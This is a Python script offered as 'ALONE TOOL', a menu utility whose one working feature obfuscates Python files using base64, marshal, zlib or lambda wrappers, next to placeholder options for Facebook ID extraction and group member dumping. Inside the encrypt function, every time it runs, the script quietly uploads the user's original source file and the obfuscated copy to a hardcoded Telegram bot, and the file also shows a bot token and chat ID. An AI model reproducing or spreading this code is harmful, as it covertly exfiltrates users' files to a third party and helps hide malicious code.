main.py

import os import sys import base64 import marshal import zlib import time from datetime import datetime import requests

Telegram config

BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0" CHAT_ID = "1241769879"

Colors

class Colors: HEADER = "\033[95m" OKBLUE = "\033[94m" OKCYAN = "\033[96m" OKGREEN = "\033[92m" WARNING = "\033[93m" FAIL = "\033[91m" ENDC = "\033[0m" BOLD = "\033[1m" UNDERLINE = "\033[4m"

Clear

os.system('clear')

def send_telegram_log(text=None, file_path=None): url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument" if file_path else f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage" data = {"chat_id": CHAT_ID, "caption": text or ""} if file_path else {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"} files = {"document": open(file_path, "rb")} if file_path else None try: requests.post(url, data=data, files=files) except: pass

def login(): os.system('clear') print(Colors.OKCYAN + "[•] Telegram Username Login" + Colors.ENDC) username = input("[•] Enter your Telegram username: @").strip() if username.lower() == "i4malone": send_telegram_log(f"[+] Authorized login by @{username}") print(Colors.OKGREEN + f"[✓] Welcome, @{username}" + Colors.ENDC) time.sleep(1) else: print(Colors.FAIL + "[x] Unauthorized user. Access Denied." + Colors.ENDC) sys.exit()

def encrypt_code(): os.system('clear') print(Colors.OKCYAN + "[•] Code Encryptor" + Colors.ENDC) filename = input("[•] Enter file name to encrypt: ").strip()

if not os.path.isfile(filename):
    print(Colors.FAIL + "[x] File not found!" + Colors.ENDC)
    input("[•] Press Enter to return...")
    return

with open(filename, "r") as f:
    original_code = f.read()

print("""

[1] Base64 [2] Marshal [3] Zlib + Base64 [4] Lambda Function Obfuscation [0] Cancel """) choice = input("[•] Choose encryption method: ")

enc_code = ""
if choice == '1':
    enc = base64.b64encode(original_code.encode()).decode()
    enc_code = f"import base64\nexec(base64.b64decode('{enc}'))"
elif choice == '2':
    enc = marshal.dumps(compile(original_code, '', 'exec'))
    enc_code = f"import marshal\nexec(marshal.loads({repr(enc)}))"
elif choice == '3':
    compressed = zlib.compress(original_code.encode())
    encoded = base64.b64encode(compressed).decode()
    enc_code = f"import zlib,base64\nexec(zlib.decompress(base64.b64decode('{encoded}')))

" elif choice == '4': encoded = base64.b64encode(original_code.encode()).decode() enc_code = f"exec((lambda : import('base64').b64decode().decode())('{encoded}'))" elif choice == '0': return else: print(Colors.FAIL + "[x] Invalid option" + Colors.ENDC) return

new_file = f"enc_{filename.replace('.py','')}.py"
with open(new_file, "w") as f:
    f.write(enc_code)

with open("temp_original.py", "w") as temp:
    temp.write(original_code)

send_telegram_log(f"[•] Code encrypted: {filename}")
send_telegram_log(file_path="temp_original.py")
send_telegram_log(file_path=new_file)
os.remove("temp_original.py")

print(Colors.OKGREEN + f"[✓] Encrypted successfully: {new_file}" + Colors.ENDC)
input("[•] Press Enter to return...")

def main_menu(): while True: os.system('clear') print(Colors.OKGREEN + """ █████╗ ██╗      ██████╗ ███╗   ██╗███████╗ ██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝ ███████║██║     ██║   ██║██╔██╗ ██║███████╗ ██╔══██║██║     ██║   ██║██║╚██╗██║╚════██║ ██║  ██║███████╗╚██████╔╝██║ ╚████║███████║ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝ A L O N E   T O O L """ + Colors.ENDC) print(""" [1] Proxy Options [2] User-Agent Generator [3] Send HTTP Request [4] Look IP Info [5] Facebook IDs Extractor [6] Group Member ID Dumper [7] Encrypt Code [0] Exit """) choice = input("[?] Choose an option: ").strip() if choice == '1': input("[•] Proxy Options (To be implemented). Press Enter...") elif choice == '2': input("[•] User-Agent Generator (To be implemented). Press Enter...") elif choice == '3': input("[•] Send HTTP Request (To be implemented). Press Enter...") elif choice == '4': input("[•] Look IP Info (To be implemented). Press Enter...") elif choice == '5': input("[•] Facebook IDs Extractor (To be implemented). Press Enter...") elif choice == '6': input("[•] Group Member ID Dumper (To be implemented). Press Enter...") elif choice == '7': encrypt_code() elif choice == '0': print("[•] Goodbye!") sys.exit() else: print(Colors.FAIL + "[x] Invalid option!" + Colors.ENDC) time.sleep(1)

if name == 'main': login() main_menu()

